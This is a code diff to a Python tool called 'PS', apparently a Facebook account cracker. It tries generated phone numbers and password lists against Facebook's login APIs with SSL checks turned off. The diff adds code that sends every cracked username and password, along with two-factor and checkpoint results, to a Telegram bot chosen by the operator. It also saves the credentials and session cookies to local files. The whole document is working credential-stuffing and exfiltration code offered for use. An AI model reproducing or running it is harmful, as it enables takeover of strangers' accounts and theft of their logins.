@@ -1,8 +1,7 @@
-import os, sys, platform, time, random, uuid, json, string, base64, re, hashlib, threading, tempfile, zipfile
+import os, sys, platform, time, random, uuid, json, string, base64, re, hashlib, threading, tempfile, zipfile, pycurl
 from os import system
 from io import BytesIO
 from time import localtime as lt
-from pip._vendor import requests
 from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from urllib.parse import quote
@@ -10,15 +9,15 @@ from urllib.parse import quote
 #----------------\<-HIDDEN-SERVICE->/----------------#
 
 #----------------\<-COLOR->/----------------#
-G = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
-R = "\x1b[38;5;93m"   # كان أحمر → بنفسجي
+G = "\x1b[38;5;93m"
+R = "\x1b[38;5;93m"
 W = "\x1b[38;5;15m"
-B = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
-Y = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
-A = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
-O = "\x1b[38;5;93m"   # كان أصفر → بنفسجي
-X = "\x1b[38;5;93m"   # كان وردي → خليته بنفسجي أقوى
-P = "\x1b[38;5;93m"   # عدلته عشان يكون متناسق
+B = "\x1b[38;5;93m"
+Y = "\x1b[38;5;93m"
+A = "\x1b[38;5;93m"
+O = "\x1b[38;5;93m"
+X = "\x1b[38;5;93m"
+P = "\x1b[38;5;93m"
 
 BLUE_LIGHT = "\033[1;34m"
 BLUE_DARK = "\033[0;34m"
@@ -38,14 +37,33 @@ xpxx = f"{G}>{W}>{G}>{W}"
 
 #----------------\<-INTERNET->/----------------#
 try:
-    requests.get("https://www.google.com", timeout=5)
-except requests.exceptions.ConnectionError:
+    test_url = "https://www.google.com"
+    test_curl = pycurl.Curl()
+    test_curl.setopt(test_curl.URL, test_url)
+    test_curl.setopt(test_curl.TIMEOUT, 5)
+    test_curl.setopt(test_curl.NOBODY, 1)
+    test_curl.perform()
+    test_curl.close()
+except:
     system("clear" if os.name == "posix" else "cls")
     print(f"{xp} NO INTERNET CONNECTION & DON'T TRY TO BYPASS")
     print(f"{R}━"*56)
     sys.exit()
 
-#----------------\<-FILE-PATH->/----------------#
+#----------------\<-NO-MODULE->/----------------#
+try:
+    import pycurl
+except ImportError as e:
+    system("clear" if os.name == "posix" else "cls")
+    missing_module = str(e).split("'")[1]
+    if missing_module == "pycurl":
+        print(f"{xp} YOU DON'T HAVE PYCURL MODULE PLZ INSTALL IT")
+        print(f"{xp} RUN {xpxx} pip install pycurl")
+        print(f"{R}━"*56)
+        sys.exit()
+
+#----------------\<-SYS->/----------------#
+sys.stdout.write('\x1b[1;37m\x1b]2; PS~\x07')
 
 #----------------\<-DATE->/----------------#
 __dic__ = {
@@ -83,6 +101,58 @@ def __CLEAR__():
 #----------------\<-LINE->/----------------#
 def __LINE__():
     print(f"{R}━"*56)
+
+#----------------\<-CURL POST FUNCTION->/----------------#
+def curl_post(url, data, headers):
+    buffer = BytesIO()
+    c = pycurl.Curl()
+    c.setopt(c.URL, url)
+    c.setopt(c.POSTFIELDS, data)
+    c.setopt(c.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])
+    c.setopt(c.WRITEDATA, buffer)
+    c.setopt(c.TIMEOUT, 10)
+    c.setopt(c.FOLLOWLOCATION, 1)
+    c.setopt(c.SSL_VERIFYPEER, 0)
+    c.setopt(c.SSL_VERIFYHOST, 0)
+    try:
+        c.perform()
+        response = buffer.getvalue().decode('utf-8')
+        return json.loads(response) if response else {}
+    except:
+        return {}
+    finally:
+        c.close()
+        buffer.close()
+
+def curl_post_fast(url, data, headers):
+    buffer = BytesIO()
+    c = pycurl.Curl()
+    c.setopt(c.URL, url)
+    c.setopt(c.POSTFIELDS, data)
+    c.setopt(c.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])
+    c.setopt(c.WRITEDATA, buffer)
+    c.setopt(c.TIMEOUT, 5)
+    c.setopt(c.FOLLOWLOCATION, 1)
+    c.setopt(c.SSL_VERIFYPEER, 0)
+    c.setopt(c.SSL_VERIFYHOST, 0)
+    try:
+        c.perform()
+        response = buffer.getvalue().decode('utf-8')
+        return json.loads(response) if response else {}
+    except:
+        return {}
+    finally:
+        c.close()
+        buffer.close()
+
+#----------------\<-TELEGRAM SEND FUNCTION->/----------------#
+def send_telegram(token, chat_id, message):
+    try:
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        post_data = f"chat_id={chat_id}&text={quote(message)}"
+        curl_post_fast(url, post_data, {"Content-Type": "application/x-www-form-urlencoded"})
+    except:
+        pass
 
 #----------------\<-UA-NORMAL-MIX->/----------------#
 def UA():
@@ -142,7 +212,7 @@ logo = f"""
 {xp} TODAYS   {xpxx} {__date__}
 {xlinex}"""
 
-#----------------\<-PS-TOOL CLASS (الكود الأصلي)->/----------------#
+#----------------\<-PS-TOOL CLASS->/----------------#
 class __PS__:
     def __init__(self) -> None:
         self.loop = 0
@@ -158,7 +228,16 @@ class __PS__:
         self.__LOCK__ = []
 
     def __MENU__(self) -> None:
+        global token_ps, id_ps
         __CLEAR__()
+        
+        # طلب التوكن والايدي مثل الكود الثاني
+        token_ps = input(f'{xp}  TOKEN {xpxx} ').strip()
+        print(xlinex)
+        
+        id_ps = input(f'{xp} ID {xpxx} ').strip()
+        print(xlinex)
+        
         print(f"{xp1} FILE CLONING ")
         print(f"{xp2} RANDOM CLONING{R} ({W}SOON{R}) ")
         print(f"{xp0} EXIT TOOLS ")
@@ -321,6 +400,7 @@ class __PS__:
         sys.exit()   
 
     def __M1X__(self, ids, names, passlist):
+        global token_ps, id_ps
         try:
             color = random.choice([
                 "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -356,19 +436,6 @@ class __PS__:
                 }
                 country_locale = random.choice(list(__locale__.keys()))
                 country_code = __locale__[country_locale]
-                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
-                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
-                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
-                fbbv = str(random.randint(10000000, 99999999))
-                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
-                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
-                width = random.randint(720, 1440)
-                height = random.randint(1080, 2560)
-                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
-                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
-                fban = random.choice(["FB4A", "FB5A", "FB6A"])
-                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
-                u2a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=1.5,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=2.5,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E556B;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1280,height=1280};FBLC/de_DE;FBRV/279865282;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M336B/DS;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                 data = {
                     "adid": adid,
                     "format": "json",
@@ -410,25 +477,30 @@ class __PS__:
                     "X-FB-Client-IP": "True",
                     "X-FB-Server-Cluster": "True",
                     "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
-                    "Content-Length": "699"
                 }
                 url = "https://graph.facebook.com/auth/login"
                 twf = "Login approval's are on. Expect an SMS shortly with a code to use for log in"
 
-                try:
-                    po = requests.post(url, data=data, headers=headers, timeout=10).json()
-                except requests.exceptions.Timeout:
-                    print(f"\n{R}[-] Timeout error for {ids} / {pas}")
-                    continue
-                except Exception as e:
-                    print(f"\n{R}[-] Exception: {str(e)}")
-                    continue
+                post_data = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
+                po = curl_post(url, post_data, headers)
 
                 if 'session_key' in po:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                     print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
+
+                    # ارسال النتيجة الى تليجرام
+                    m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M1-GRAPH
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
 
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
@@ -437,37 +509,73 @@ class __PS__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{R}<{W}[{R}COOKIE{W}]{R}> {colorX}{cookie}')
-                    open('/sdcard/PS-/FILE/PS-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    try:
+                        os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
+                        open('/sdcard/PS-/FILE/PS-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    except:
+                        pass
                     self.oks.append(ids)
                     break
 
                 if twf in str(po):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{R}<{W}[{R}PS-2F{W}]{R}> {R}' + ids + f'/' + pas + '\033[1;97m')
+                    
+                    # ارسال 2F الى تليجرام
+                    m = f"""حساب سكيور ❌ (2F)
 
-                    open('/sdcard/PS-/FILE/PS-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M1-GRAPH
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
+                    try:
+                        os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
+                        open('/sdcard/PS-/FILE/PS-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    except:
+                        pass
                     self.twf.append(ids)
                     break
 
                 if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
-                        
-                    open('/sdcard/PS-/FILE/PS-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    
+                    # ارسال CP الى تليجرام
+                    m = f"""حساب سكيور ❌ (CP)
+
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M1-GRAPH
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
+                    try:
+                        os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
+                        open('/sdcard/PS-/FILE/PS-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    except:
+                        pass
                     self.cps.append(ids)
                     break
                 else:
                     continue
             self.loop += 1
-
-        except requests.exceptions.Timeout:
-            time.sleep(20)
-        except requests.exceptions.ConnectionError:
-            time.sleep(20)
         except Exception as e:
             pass
 
     def __M2X__(self, ids, names, passlist):
+        global token_ps, id_ps
         try:
             color = random.choice([
                 "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -552,13 +660,25 @@ class __PS__:
                 }
                 url = "https://b-graph.facebook.com/auth/login"
                 twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
-                po = requests.post(url, data=data, headers=headers).json()
+                post_data = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
+                po = curl_post(url, post_data, headers)
                 if 'session_key' in po:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                     print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
+                    
+                    m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
 
+❖ - METHOD : M2-B-GRAPH
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -566,34 +686,69 @@ class __PS__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{R}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/PS-/FILE/PS-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    try:
+                        os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
+                        open('/sdcard/PS-/FILE/PS-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    except:
+                        pass
                     self.oks.append(ids)
                     break
                 if twf in str(po):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    
+                    m = f"""حساب سكيور ❌ (2F)
 
-                    open('/sdcard/PS-/FILE/PS-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M2-B-GRAPH
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
+                    try:
+                        os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
+                        open('/sdcard/PS-/FILE/PS-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    except:
+                        pass
                     self.twf.append(ids)
                     break
-                if 'www.facebook.com' in po['error']['message']:
+                if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
-                        
-                    open('/sdcard/PS-/FILE/PS-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    
+                    m = f"""حساب سكيور ❌ (CP)
+
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M2-B-GRAPH
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
+                    try:
+                        os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
+                        open('/sdcard/PS-/FILE/PS-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    except:
+                        pass
                     self.cps.append(ids)
                     break
                 else:
                     continue
             self.loop += 1
-        except requests.exceptions.Timeout:
-            time.sleep(20)
-        except requests.exceptions.ConnectionError:
-            time.sleep(20)
         except Exception as e:
             pass
 
     def __M3X__(self, ids, names, passlist):
+        global token_ps, id_ps
         try:
             color = random.choice([
                 "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -674,13 +829,25 @@ class __PS__:
                 }
                 url = "https://api.facebook.com/auth/login"
                 twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
-                po = requests.post(url, data=data, headers=headers).json()
+                post_data = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
+                po = curl_post(url, post_data, headers)
                 if 'session_key' in po:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                     print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')
+                    
+                    m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
 
+❖ - METHOD : M3-API
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -688,30 +855,64 @@ class __PS__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{R}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/PS-/FILE/PS-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    try:
+                        os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
+                        open('/sdcard/PS-/FILE/PS-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    except:
+                        pass
                     self.oks.append(ids)
                     break
                 if twf in str(po):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    
+                    m = f"""حساب سكيور ❌ (2F)
 
-                    open('/sdcard/PS-/FILE/PS-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M3-API
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
+                    try:
+                        os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
+                        open('/sdcard/PS-/FILE/PS-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    except:
+                        pass
                     self.twf.append(ids)
                     break
-                if 'www.facebook.com' in po['error']['message']:
+                if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
-                        
-                    open('/sdcard/PS-/FILE/PS-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    
+                    m = f"""حساب سكيور ❌ (CP)
+
+❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
+❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}
+
+❖ - METHOD : M3-API
+
+ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
+DEV :: @p7s7s ~ PS 
+ trust » t.me/ali313eme8
+ ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
+                    send_telegram(token_ps, id_ps, m)
+                    
+                    try:
+                        os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)
+                        open('/sdcard/PS-/FILE/PS-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    except:
+                        pass
                     self.cps.append(ids)
                     break
                 else:
                     continue
             self.loop += 1
-        except requests.exceptions.Timeout:
-            time.sleep(20)
-        except requests.exceptions.ConnectionError:
-            time.sleep(20)
         except Exception as e:
             pass
 
@@ -737,7 +938,6 @@ brands = {
     "Huawei Y9a": "Huawei"
 }
 
-# قائمة الدول والأكواد
 countries_data = {
     "1": {"name": "Algeria", "codes": ["055", "056", "066", "067", "077", "079"]},
     "2": {"name": "Saudi Arabia", "codes": ["050", "053", "054", "055", "056", "058"]},
@@ -770,17 +970,13 @@ def show_countries():
     print(f"{G}{'='*50}{W}\n")
 
 def get_network_code():
-    """اختيار رمز الشبكة من القائمة أو إدخال يدوي"""
     show_countries()
     choice = input(f'{xp} Select the country number (1-22)  {xpxx} ').strip()
-    
     if choice in countries_data:
         country = countries_data[choice]
         print(f"{xp}I have chosen: {G}{country['name']}{W}")
         print(f"{xp}Available codes: {G}{' | '.join(country['codes'])}{W}")
-        
         sim = input(f'{xp} INPUT CHOSE ({ " | ".join(country["codes"]) }) {xpxx} ').strip()
-        
         if sim in country["codes"]:
             return sim
         else:
@@ -789,15 +985,7 @@ def get_network_code():
     else:
         return input(f'{xp} INPUT CHOSE (مثال: 0750 | 0770 | 0780) {xpxx} ').strip()
 
-def send_telegram(token, chat_id, message):
-    try:
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        data = {"chat_id": chat_id, "text": message}
-        requests.post(url, data=data, timeout=5)
-    except:
-        pass
-
-def pm(email_or_phone, password):
+def pm_cracker(email_or_phone, password):
     device_id = str(uuid.uuid4())
     family_device_id = str(uuid.uuid4())
     secure_family_device_id = str(uuid.uuid4())
@@ -832,10 +1020,11 @@ def pm(email_or_phone, password):
     }
     return payload
 
-def get_cookies(ids, pw):
+def get_cookies_cracker(ids, pw):
     try:
-        data = pm(ids, pw)
-        req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers_cracker, data=data).json()
+        data = pm_cracker(ids, pw)
+        post_data = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
+        req = curl_post_fast('https://b-graph.facebook.com/auth/login', post_data, headers_cracker)
         if 'session_key' in req:
             ckkk = ';'.join(i['name'] + '=' + i['value'] for i in req['session_cookies'])
             ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
@@ -845,19 +1034,20 @@ def get_cookies(ids, pw):
     return "No Cookie"
 
 def crackfree(ids, pwxs):
-    global ok_cracker, loop_cracker
-    sys.stdout.write(f'\r\r\r\033[1;37m\033[1m{xp} {G}<[{W}PS-{loop_cracker}{G}]> {G}<[{W}OK-{ok_cracker}{G}]>'),
+    global ok_cracker, loop_cracker, token_cracker, id_cracker
+    sys.stdout.write(f'\r\r\r\033[1;37m\033[1m{xp} {G}<[{W}PS-{loop_cracker}{G}]> {G}<[{W}OK-{ok_cracker}{G}]>')
     sys.stdout.flush()
     
     for pw in pwxs:
         try:
-            data = pm(ids, pw)
-            req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers_cracker, data=data).json()
+            data = pm_cracker(ids, pw)
+            post_data = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
+            req = curl_post_fast('https://b-graph.facebook.com/auth/login', post_data, headers_cracker)
             
             if 'session_key' in req:
                 uid = req["uid"]
                 ok_cracker += 1
-                coki = get_cookies(ids, pw)
+                coki = get_cookies_cracker(ids, pw)
                 
                 print(f"\r\r\033[0;32m\033[1m{xp} {G}<[PS-OK{G}]> {uid} | {pw}   ")
                 print(xlinex)
@@ -894,9 +1084,8 @@ DEV :: @p7s7s ~ PS
                 
                 send_telegram(token_cracker, id_cracker, m)
                 break
-                
-        except requests.exceptions.ConnectionError:
-            time.sleep(1)
+        except:
+            pass
     
     loop_cracker += 1
 
@@ -911,17 +1100,14 @@ def menu_cracker():
     id_cracker = input(f'{xp} ID {xpxx} ').strip()
     print(xlinex)
     
-    # اختيار رمز الشبكة
     sim = get_network_code()
     print(xlinex)
     
-    # إنشاء الأرقام العشوائية
     ids_list = []
     for _ in range(44444):  
         nmp = "".join(random.choice('1234509876') for ing in range(7))
         ids_list.append(nmp)
     
-    # إعداد الهيدرز
     android = random.choice(android_versions)
     device = random.choice(devices)
     brand = brands[device]
@@ -967,7 +1153,7 @@ def menu_cracker():
     input(f"{xp} Press Enter to return to main menu...")
     main_menu()
 
-#----------------\<-MAIN MENU (القائمة الرئيسية)->/----------------#
+#----------------\<-MAIN MENU->/----------------#
 def main_menu():
     while True:
         os.system('clear' if os.name == 'posix' else 'cls')
